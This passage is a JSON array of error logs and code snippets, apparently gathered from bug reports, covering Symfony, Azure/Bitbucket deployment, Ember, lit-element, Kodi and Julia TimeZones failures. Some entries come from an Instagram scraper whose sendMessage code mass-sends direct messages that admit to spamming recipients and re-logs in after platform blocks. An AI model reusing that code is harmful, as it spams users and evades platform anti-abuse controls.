Symfony\\\\Component\\\\Intl\\\\NumberFormatter\\\\NumberFormatter::__construct() method's argument $style value 0 behavior is not implemented. The available styles are: CURRENCY, DECIMAL..  Please install the \\\"intl\\\" extension for full localization\r\n capabilities. at /var/www/project/vendor/symfony/symfony/src/Symfony/Component/Intl/NumberFormatter/NumberFormatter.php:292)\"} []"
    },
    {
        "logs": "Failed to set up continuous deployment for web app [NAME OF APP], using Bitbucket. Repository 'UpdateSiteSourceControl' operation failed with Microsoft.Web.Hosting.SourceControls.OAuthException: Bitbucket AddSSHKey: (500) InternalServerError.\r\nat Microsoft.Web.Hosting.SourceControls.BitbucketV2Proxy.<AddSSHKey>d__57.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\nat System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task)\r\nat System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\nat Microsoft.Web.Hosting.Administration.BitbucketV2SiteRepositoryProvider.<UpdateSiteSourceControl>d__6.MoveNext()."
    },
    {
        "logs": "Failed to set up continuous deployment for web app [NAME OF APP], using Bitbucket. Repository 'UpdateSiteSourceControl' operation failed with Microsoft.Web.Hosting.SourceControls.OAuthException: Bitbucket AddSSHKey: (500) InternalServerError.\r\nat Microsoft.Web.Hosting.SourceControls.BitbucketV2Proxy.<AddSSHKey>d__57.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\nat System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task)\r\nat System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\nat Microsoft.Web.Hosting.Administration.BitbucketV2SiteRepositoryProvider.<UpdateSiteSourceControl>d__6.MoveNext()."
    },
    {
        "logs": "ember build -dev\r\nversion: 2.3.0\r\nBuildingDeprecation warning: sassOptions should be moved to your ember-cli-build\r\nBuilt project successfully. Stored in \"dist/\".\r\n\r\nember build -prod\r\nversion: 2.3.0\r\nBuildingDeprecation warning: sassOptions should be moved to your ember-cli-build\r\nBuilding... (hangs here)"
    },
    {
        "logs": ";\r\n  }\r\n\r\n  static get properties() {\r\n    return {\r\n      _items: Array\r\n    }\r\n  }\r\n\r\n  constructor() {\r\n     super();\r\n     this._items = [];\r\n   }\r\n\r\n  _stateChanged(state) {\r\n     if (Object.keys(state.items).length !== 0) {\r\n       this._items = state.items;\r\n     }\r\n   }\r\n\r\n   \r\n..."
    },
    {
        "logs": "virtual-repeater.js:497 Uncaught TypeError: Cannot read property 'getBoundingClientRect' of null\r\n    at Object._measureChild (virtual-repeater.js:497)\r\n    at Object._measureChild (lit-repeater.js:83)\r\n    at children.map (virtual-repeater.js:233)\r\n    at Array.map (<anonymous>)\r\n    at Object._measureChildren (virtual-repeater.js:232)\r\n    at Object._render (virtual-repeater.js:288)\r\n    at Object._render (virtual-scroller.js:208)\r\n    at _pendingRender.requestAnimationFrame (virtual-repeater.js:201)\r\nUncaught TypeError: Failed to execute 'observe' on 'ResizeObserver': parameter 1 is not of type 'Element'.\r\n    at _kids.forEach.child (virtual-scroller.js:218)\r\n    at Array.forEach (<anonymous>)\r\n    at Object._render (virtual-scroller.js:218)\r\n    at _pendingRender.requestAnimationFrame (virtual-repeater.js:201)"
    },
    {
        "logs": "...\r\n\r\nimport { virtualScroller } from '../../libs/lit-scroller.js';\r\n\r\nclass CreatorPrintsList extends connect(store)(LitElement) {\r\n\r\n  _render({_items}) {\r\n    return html`\r\n      <div class=\"list\">\r\n      \r\n        ${ virtualScroller(_items.length, (i) => html`\r\n            ${console.log(_items[i].id)}       // \"Cannot read property 'id' of undefined\"\r\n            ${console.log(this._items[i].id)}  // working, returns id of 3\r\n        `) }\r\n        \r\n      </div>`;\r\n  }\r\n\r\n  static get properties() {\r\n    return {\r\n      _items: Array\r\n    }\r\n  }\r\n\r\n  constructor() {\r\n     super();\r\n     this._items = [];\r\n   }\r\n\r\n  _stateChanged(state) {\r\n     if (Object.keys(state.items).length !== 0) {\r\n       this._items = state.items;\r\n     }\r\n   }\r\n\r\n   \r\n..."
    },
    {
        "logs": "virtual-repeater.js:497 Uncaught TypeError: Cannot read property 'getBoundingClientRect' of null\r\n    at Object._measureChild (virtual-repeater.js:497)\r\n    at Object._measureChild (lit-repeater.js:83)\r\n    at children.map (virtual-repeater.js:233)\r\n    at Array.map (<anonymous>)\r\n    at Object._measureChildren (virtual-repeater.js:232)\r\n    at Object._render (virtual-repeater.js:288)\r\n    at Object._render (virtual-scroller.js:208)\r\n    at _pendingRender.requestAnimationFrame (virtual-repeater.js:201)\r\nUncaught TypeError: Failed to execute 'observe' on 'ResizeObserver': parameter 1 is not of type 'Element'.\r\n    at _kids.forEach.child (virtual-scroller.js:218)\r\n    at Array.forEach (<anonymous>)\r\n    at Object._render (virtual-scroller.js:218)\r\n    at _pendingRender.requestAnimationFrame (virtual-repeater.js:201)"
    },
    {
        "logs": "10:02:46.885 T:18446744072501378232  NOTICE: Trying to open: 44100 samplerate 12 channelMask 4 encoding\r\n10:02:46.895 T:18446744072501378232  NOTICE: CAESinkAUDIOTRACK::Initializing with: m_sampleRate: 44100 format: AE_FMT_FLOAT (AE) method: PCM stream-type: PCM-STREAM min_buffer_size: 45152 m_frames: 2822 m_frameSize: 8 channels: 2\r\n10:07:34.104 T:18446744072501378232  NOTICE: Trying to open: 44100 samplerate 12 channelMask 4 encoding\r\n10:07:34.112 T:18446744072501378232  NOTICE: CAESinkAUDIOTRACK::Initializing with: m_sampleRate: 44100 format: AE_FMT_FLOAT (AE) method: PCM stream-type: PCM-STREAM min_buffer_size: 45152 m_frames: 2822 m_frameSize: 8 channels: 2\r\n10:07:58.914 T:18446744072531893728   ERROR: EXCEPTION: Dialog not created.\r\n10:08:01.066 T:18446744072531893728 WARNING: CSkinInfo: failed to load skin settings\r\n10:08:01.930 T:18446744072531893728   ERROR: EXCEPTION: Dialog not created.\r\n10:08:19.223 T:18446744072499596904  NOTICE: VideoPlayer: Opening: https://vodus-i-video-nfl.akamaized.net/vodus/e9323e31-b160-4bd0-b5f7-84587d9ea8b9/NoADs_ATL_PHI_1080_reg1.ism/QualityLevels(3443943)/Manifest(video,format=m3u8-aapl-v3,audiotrack=aac_UND_2_128,filter=chromecast)?hdnea=st=1536505324~exp=1536505504~acl=/*~hmac=ed186b915cdc304eaa06c481acddc98724ca77c5832cd710bead57e83e4a5415&hdcore=2.11.3|Connection=keep-alive&User-Agent=Firefox|Connection=keep-alive&User-Agent=Firefox\r\n10:08:19.223 T:18446744072499596904 WARNING: CDVDMessageQueue(player)::Put MSGQ_NOT_INITIALIZED\r\n10:08:19.347 T:18446744072548641904  NOTICE: Creating InputStream\r\n10:08:19.999 T:18446744072548641904  NOTICE: Creating Demuxer\r\n10:08:50.358 T:18446744072548641904   ERROR: OpenDemuxStream - Error creating demuxer\r\n10:08:50.358 T:18446744072548641904  NOTICE: CVideoPlayer::OnExit()\r\n10:08:50.440 T:18446744072499596904  NOTICE: CVideoPlayer::CloseFile()\r\n10:08:50.440 T:18446744072499596904  NOTICE: VideoPlayer: waiting for threads to exit\r\n10:08:50.440 T:18446744072499596904  NOTICE: VideoPlayer: finished waiting\r\n10:08:50.441 T:18446744072499596904  NOTICE: CVideoPlayer::CloseFile()\r\n10:08:50.441 T:18446744072499596904  NOTICE: VideoPlayer: waiting for threads to exit\r\n10:08:50.441 T:18446744072499596904  NOTICE: VideoPlayer: finished waiting"
    },
    {
        "logs": "IgActionSpamError: POST /api/v1/direct_v2/threads/broadcast/text/ - 400 Bad Request; feedback_required\r\n    at Request.handleResponseError (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/core/request.js:98:20)\r\n    at Request.send (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/core/request.js:52:28)\r\n    at async DirectThreadRepository.broadcast (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/repositories/direct-thread.repository.js:176:26)\r\n    at async DirectThreadEntity.broadcast (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/entities/direct-thread.entity.js:180:26)\r\n    at async DirectThreadEntity.broadcastText (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/node_modules/instagram-private-api/dist/entities/direct-thread.entity.js:25:16)\r\n    at async Device.sendMessage (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/services/device.js:115:7)\r\n    at async SendMessages._sendMessage (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/services/instagram/send-messages.js:88:22)\r\n    at async SendMessages.call (/Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/services/instagram/send-messages.js:79:5)\r\n    at async /Users/sergey/RubymineProjects/node/instagenius-instagram-scraper/services/jobs.init.js:32:7"
    },
    {
        "logs": ")\r\n      console.log('message was sent to', user.id, user.username  )\r\n    } catch (e) {\r\n      console.error('Device#sendMessage Error', e.message)\r\n      throw e\r\n    }\r\n  }"
    },
    {
        "logs": ")\r\n      console.log('send message to', user.id, user.username)\r\n    } catch (e) {\r\n      console.error('Device#sendMessage Error', e.name, e.message)\r\n      if (e instanceof IgLoginRequiredError) {\r\n        await this.login()\r\n        return this.sendMessage(user)\r\n      }\r\n      if (e instanceof IgCheckpointError) {\r\n        sentryHelper.sendNotification(e, this.username)\r\n      }\r\n      if (e instanceof IgNotFoundError) return null\r\n      throw e\r\n    }\r\n  }"
    },
    {
        "logs": "async sendMessage(user) {\r\n    try {\r\n      await this.ig.entity.directThread([user.id.toString()]).broadcastText(`Hi ${user.username}!  test text`)\r\n      console.log('message was sent to', user.id, user.username  )\r\n    } catch (e) {\r\n      console.error('Device#sendMessage Error', e.message)\r\n      throw e\r\n    }\r\n  }"
    },
    {
        "logs": "async sendMessage(user) {\r\n    try {\r\n      await this.ig.entity.directThread([user.id.toString()]).broadcastText(`Hi ${user.username}! I\\'m really sorry but i need to spam you!!! Don\\'t block me!!! :)`)\r\n      console.log('send message to', user.id, user.username)\r\n    } catch (e) {\r\n      console.error('Device#sendMessage Error', e.name, e.message)\r\n      if (e instanceof IgLoginRequiredError) {\r\n        await this.login()\r\n        return this.sendMessage(user)\r\n      }\r\n      if (e instanceof IgCheckpointError) {\r\n        sentryHelper.sendNotification(e, this.username)\r\n      }\r\n      if (e instanceof IgNotFoundError) return null\r\n      throw e\r\n    }\r\n  }"
    },
    {
        "logs": ": \r\n Downloading artifact: tzdata2021a\r\n[ Info: Installing 2021a tzdata region data\r\nERROR: LoadError: IOError: sendfile: operation not supported on socket (ENOTSUP)\r\nStacktrace:\r\n  [1] uv_error\r\n    @ ./libuv.jl:97 [inlined]\r\n  [2] sendfile(dst::Base.Filesystem.File, src::Base.Filesystem.File, src_offset::Int64, bytes::Int64)\r\n    @ Base.Filesystem ./filesystem.jl:119\r\n  [3] sendfile(src::String, dst::String)\r\n    @ Base.Filesystem ./file.jl:960\r\n  [4] cp(src::String, dst::String; force::Bool, follow_symlinks::Bool)\r\n    @ Base.Filesystem ./file.jl:355\r\n  [5] build(version::String, regions::Vector{String}, archive_dir::String, tz_source_dir::String, compiled_dir::String; verbose::Bool)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/tzdata/build.jl:64\r\n  [6] build(version::String)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/tzdata/build.jl:121\r\n  [7] build(version::String; force::Bool)\r\n    @ TimeZones /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/build.jl:11\r\n  [8] build (repeats 2 times)\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/build.jl:11 [inlined]\r\n  [9] top-level scope\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/deps/build.jl:3\r\n [10] include(fname::String)\r\n    @ Base.MainInclude ./client.jl:444\r\n [11] top-level scope\r\n    @ none:5\r\nin expression starting at /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/deps/build.jl:3"
    },
    {
        "logs": ": \r\n[ Info: Installing 2021a tzdata region data\r\n[ Info: /mnt/storage/sebastian/.julia/artifacts/6d94ada27957590cbd0d7678f5ae711232a4d714/africa -> /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/tzsource/africa\r\nERROR: LoadError: IOError: sendfile: operation not supported on socket (ENOTSUP)\r\nStacktrace:\r\n  [1] uv_error\r\n    @ ./libuv.jl:97 [inlined]\r\n  [2] sendfile(dst::Base.Filesystem.File, src::Base.Filesystem.File, src_offset::Int64, bytes::Int64)\r\n    @ Base.Filesystem ./filesystem.jl:119\r\n  [3] sendfile(src::String, dst::String)\r\n    @ Base.Filesystem ./file.jl:960\r\n  [4] cp(src::String, dst::String; force::Bool, follow_symlinks::Bool)\r\n    @ Base.Filesystem ./file.jl:355\r\n  [5] build(version::String, regions::Vector{String}, archive_dir::String, tz_source_dir::String, compiled_dir::String; verbose::Bool)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/tzdata/build.jl:67\r\n  [6] build(version::String)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/tzdata/build.jl:124\r\n  [7] build(version::String; force::Bool)\r\n    @ TimeZones /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/build.jl:11\r\n  [8] build (repeats 2 times)\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/build.jl:11 [inlined]\r\n  [9] top-level scope\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/build.jl:3\r\n [10] include(fname::String)\r\n    @ Base.MainInclude ./client.jl:444\r\n [11] top-level scope\r\n    @ none:5\r\nin expression starting at /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/build.jl:3\r\nStacktrace:\r\n  [1] pkgerror(msg::String)\r\n    @ Pkg.Types /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Types.jl:55\r\n  [2] (::Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec})()\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1044\r\n  [3] withenv(::Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, ::Pair{String, String}, ::Vararg{Pair{String, B} where B, N} where N)\r\n    @ Base ./env.jl:161\r\n  [4] (::Pkg.Operations.var\"#109#113\"{String, Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.PackageSpec})()\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1542\r\n  [5] with_temp_env(fn::Pkg.Operations.var\"#109#113\"{String, Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.PackageSpec}, temp_env::String)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1444\r\n  [6] (::Pkg.Operations.var\"#108#112\"{Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.Context, Pkg.Types.PackageSpec, String, Pkg.Types.Project, String})(tmp::String)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1517\r\n  [7] mktempdir(fn::Pkg.Operations.var\"#108#112\"{Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.Context, Pkg.Types.PackageSpec, String, Pkg.Types.Project, String}, parent::String; prefix::String)\r\n    @ Base.Filesystem ./file.jl:729\r\n  [8] mktempdir(fn::Function, parent::String) (repeats 2 times)\r\n    @ Base.Filesystem ./file.jl:727\r\n  [9] sandbox(fn::Function, ctx::Pkg.Types.Context, target::Pkg.Types.PackageSpec, target_path::String, sandbox_path::String, sandbox_project_override::Pkg.Types.Project)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1483\r\n [10] build_versions(ctx::Pkg.Types.Context, uuids::Vector{Base.UUID}; verbose::Bool)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1025\r\n [11] build_versions\r\n    @ /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:952 [inlined]\r\n [12] add(ctx::Pkg.Types.Context, pkgs::Vector{Pkg.Types.PackageSpec}, new_git::Vector{Base.UUID}; preserve::Pkg.Types.PreserveLevel, platform::Base.BinaryPlatforms.Platform)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1241\r\n [13] add(ctx::Pkg.Types.Context, pkgs::Vector{Pkg.Types.PackageSpec}; preserve::Pkg.Types.PreserveLevel, platform::Base.BinaryPlatforms.Platform, kwargs::Base.Iterators.Pairs{Symbol, Base.TTY, Tuple{Symbol}, NamedTuple{(:io,), Tuple{Base.TTY}}})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:203\r\n [14] add(pkgs::Vector{Pkg.Types.PackageSpec}; io::Base.TTY, kwargs::Base.Iterators.Pairs{Union{}, Union{}, Tuple{}, NamedTuple{(), Tuple{}}})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:79\r\n [15] add(pkgs::Vector{Pkg.Types.PackageSpec})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:77\r\n [16] #add#22\r\n    @ /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:74 [inlined]\r\n [17] add(pkg::Pkg.Types.PackageSpec)\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:74\r\n [18] top-level scope\r\n    @ REPL[2]:1"
    },
    {
        "logs": "julia> using TimeZones\r\n\r\n[Truncated]\n/dev/sda2 on / type xfs (rw,relatime,seclabel,attr2,inode64,noquota)\r\nselinuxfs on /sys/fs/selinux type selinuxfs (rw,relatime)\r\ndebugfs on /sys/kernel/debug type debugfs (rw,relatime)\r\nmqueue on /dev/mqueue type mqueue (rw,relatime,seclabel)\r\nhugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,seclabel)\r\n/dev/sda1 on /boot type xfs (rw,relatime,seclabel,attr2,inode64,noquota)\r\n/dev/sda5 on /home type xfs (rw,relatime,seclabel,attr2,inode64,noquota)\r\nsunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw,relatime)\r\n172.16.9.1:/data1 on /mnt/storage type nfs4 (rw,nosuid,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,soft,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=172.16.9.11,local_lock=none,addr=172.16.9.1,_netdev)\r\ntmpfs on /run/user/42 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=42,gid=42)\r\ntmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1000,gid=1000)\r\ntmpfs on /run/user/1005 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1005,gid=900)\r\ntmpfs on /run/user/1002 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1002,gid=900)\r\ntmpfs on /run/user/1003 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1003,gid=900)\r\ntmpfs on /run/user/1009 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1009,gid=900)\r\nsystemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=29,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=374563956)\r\nfusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)\r\ntmpfs on /run/user/1004 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1004,gid=900)\r\ntmpfs on /run/user/1008 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1008,gid=900)"
    },
    {
        "logs": "julia\r\nBuilding TimeZones \u2192 `/mnt/storage/sebastian/.julia/scratchspaces/44cfe95a-1eb2-52ea-b672-e2afdf69b78f/960099aed321e05ac649c90d583d59c9309faee1/build.log`\r\nERROR: Error building `TimeZones`: \r\n Downloading artifact: tzdata2021a\r\n[ Info: Installing 2021a tzdata region data\r\nERROR: LoadError: IOError: sendfile: operation not supported on socket (ENOTSUP)\r\nStacktrace:\r\n  [1] uv_error\r\n    @ ./libuv.jl:97 [inlined]\r\n  [2] sendfile(dst::Base.Filesystem.File, src::Base.Filesystem.File, src_offset::Int64, bytes::Int64)\r\n    @ Base.Filesystem ./filesystem.jl:119\r\n  [3] sendfile(src::String, dst::String)\r\n    @ Base.Filesystem ./file.jl:960\r\n  [4] cp(src::String, dst::String; force::Bool, follow_symlinks::Bool)\r\n    @ Base.Filesystem ./file.jl:355\r\n  [5] build(version::String, regions::Vector{String}, archive_dir::String, tz_source_dir::String, compiled_dir::String; verbose::Bool)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/tzdata/build.jl:64\r\n  [6] build(version::String)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/tzdata/build.jl:121\r\n  [7] build(version::String; force::Bool)\r\n    @ TimeZones /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/build.jl:11\r\n  [8] build (repeats 2 times)\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/build.jl:11 [inlined]\r\n  [9] top-level scope\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/deps/build.jl:3\r\n [10] include(fname::String)\r\n    @ Base.MainInclude ./client.jl:444\r\n [11] top-level scope\r\n    @ none:5\r\nin expression starting at /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/deps/build.jl:3"
    },
    {
        "logs": "julia\r\nResolving package versions...\r\n    Updating `/mnt/storage/epoch/dev/Project.toml`\r\n  [f269a46b] + TimeZones v1.5.5 `https://github.com/JuliaTime/TimeZones.jl.git#cv/build-debug`\r\n    Updating `/mnt/storage/epoch/dev/Manifest.toml`\r\n  [8f5d6c58] + EzXML v1.1.0\r\n  [78c3b35d] + Mocking v0.7.1\r\n  [f269a46b] + TimeZones v1.5.5 `https://github.com/JuliaTime/TimeZones.jl.git#cv/build-debug`\r\n    Building TimeZones \u2192 `/mnt/storage/sebastian/.julia/scratchspaces/44cfe95a-1eb2-52ea-b672-e2afdf69b78f/8856fa551085f6bbb29e0e9800d3be7ecf8e0db8/build.log`\r\nERROR: Error building `TimeZones`: \r\n[ Info: Installing 2021a tzdata region data\r\n[ Info: /mnt/storage/sebastian/.julia/artifacts/6d94ada27957590cbd0d7678f5ae711232a4d714/africa -> /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/tzsource/africa\r\nERROR: LoadError: IOError: sendfile: operation not supported on socket (ENOTSUP)\r\nStacktrace:\r\n  [1] uv_error\r\n    @ ./libuv.jl:97 [inlined]\r\n  [2] sendfile(dst::Base.Filesystem.File, src::Base.Filesystem.File, src_offset::Int64, bytes::Int64)\r\n    @ Base.Filesystem ./filesystem.jl:119\r\n  [3] sendfile(src::String, dst::String)\r\n    @ Base.Filesystem ./file.jl:960\r\n  [4] cp(src::String, dst::String; force::Bool, follow_symlinks::Bool)\r\n    @ Base.Filesystem ./file.jl:355\r\n  [5] build(version::String, regions::Vector{String}, archive_dir::String, tz_source_dir::String, compiled_dir::String; verbose::Bool)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/tzdata/build.jl:67\r\n  [6] build(version::String)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/tzdata/build.jl:124\r\n  [7] build(version::String; force::Bool)\r\n    @ TimeZones /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/build.jl:11\r\n  [8] build (repeats 2 times)\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/build.jl:11 [inlined]\r\n  [9] top-level scope\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/build.jl:3\r\n [10] include(fname::String)\r\n    @ Base.MainInclude ./client.jl:444\r\n [11] top-level scope\r\n    @ none:5\r\nin expression starting at /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/build.jl:3\r\nStacktrace:\r\n  [1] pkgerror(msg::String)\r\n    @ Pkg.Types /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Types.jl:55\r\n  [2] (::Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec})()\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1044\r\n  [3] withenv(::Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, ::Pair{String, String}, ::Vararg{Pair{String, B} where B, N} where N)\r\n    @ Base ./env.jl:161\r\n  [4] (::Pkg.Operations.var\"#109#113\"{String, Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.PackageSpec})()\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1542\r\n  [5] with_temp_env(fn::Pkg.Operations.var\"#109#113\"{String, Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.PackageSpec}, temp_env::String)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1444\r\n  [6] (::Pkg.Operations.var\"#108#112\"{Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.Context, Pkg.Types.PackageSpec, String, Pkg.Types.Project, String})(tmp::String)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1517\r\n  [7] mktempdir(fn::Pkg.Operations.var\"#108#112\"{Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.Context, Pkg.Types.PackageSpec, String, Pkg.Types.Project, String}, parent::String; prefix::String)\r\n    @ Base.Filesystem ./file.jl:729\r\n  [8] mktempdir(fn::Function, parent::String) (repeats 2 times)\r\n    @ Base.Filesystem ./file.jl:727\r\n  [9] sandbox(fn::Function, ctx::Pkg.Types.Context, target::Pkg.Types.PackageSpec, target_path::String, sandbox_path::String, sandbox_project_override::Pkg.Types.Project)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1483\r\n [10] build_versions(ctx::Pkg.Types.Context, uuids::Vector{Base.UUID}; verbose::Bool)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1025\r\n [11] build_versions\r\n    @ /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:952 [inlined]\r\n [12] add(ctx::Pkg.Types.Context, pkgs::Vector{Pkg.Types.PackageSpec}, new_git::Vector{Base.UUID}; preserve::Pkg.Types.PreserveLevel, platform::Base.BinaryPlatforms.Platform)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1241\r\n [13] add(ctx::Pkg.Types.Context, pkgs::Vector{Pkg.Types.PackageSpec}; preserve::Pkg.Types.PreserveLevel, platform::Base.BinaryPlatforms.Platform, kwargs::Base.Iterators.Pairs{Symbol, Base.TTY, Tuple{Symbol}, NamedTuple{(:io,), Tuple{Base.TTY}}})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:203\r\n [14] add(pkgs::Vector{Pkg.Types.PackageSpec}; io::Base.TTY, kwargs::Base.Iterators.Pairs{Union{}, Union{}, Tuple{}, NamedTuple{(), Tuple{}}})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:79\r\n [15] add(pkgs::Vector{Pkg.Types.PackageSpec})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:77\r\n [16] #add#22\r\n    @ /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:74 [inlined]\r\n [17] add(pkg::Pkg.Types.PackageSpec)\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:74\r\n [18] top-level scope\r\n    @ REPL[2]:1"
    }
]